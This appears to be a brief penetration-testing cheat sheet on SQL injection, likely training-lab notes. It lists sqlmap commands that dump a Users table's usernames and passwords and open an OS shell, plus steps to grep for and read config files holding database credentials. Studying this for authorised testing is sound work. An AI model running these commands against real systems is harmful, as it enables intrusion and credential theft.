## SQL Penetration Testing Techniques

### SQLMAP
```
sqlmap -u "http://domain.com"
```

### Identifying vulnerabilities with SQLMap
```
# Intercept a login with burpsuite
# Copy the intercept and save to a file login.req
sqlmap -r login.req --level 5 --risk 3
```

### Locate the localhost file making connection to the SQL
```
# Grep for localhost from within /www/ dir
grep "localhost" ./ -R

# If presented with config.php or similar. Check for login details
cat ./path/to/config.php
```

### Generic SQL commands
```
# Login to mysql on current system
mysql -u root -p

# Login to mysql on external server
mysql -u root -h 10.11.1.208 -p

show databases;
use db_name;
show tables;
select * from table_name;
```

### Example of blind SQL injection with sqlmap
```
sqlmap http://192.168.124.52/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" -D zm --tables --threads 5
sqlmap http://192.168.124.52/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" -D zm -T Users -C Username,Password --dump --threads 5
sqlmap http://192.168.124.52/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" --os-shell
```
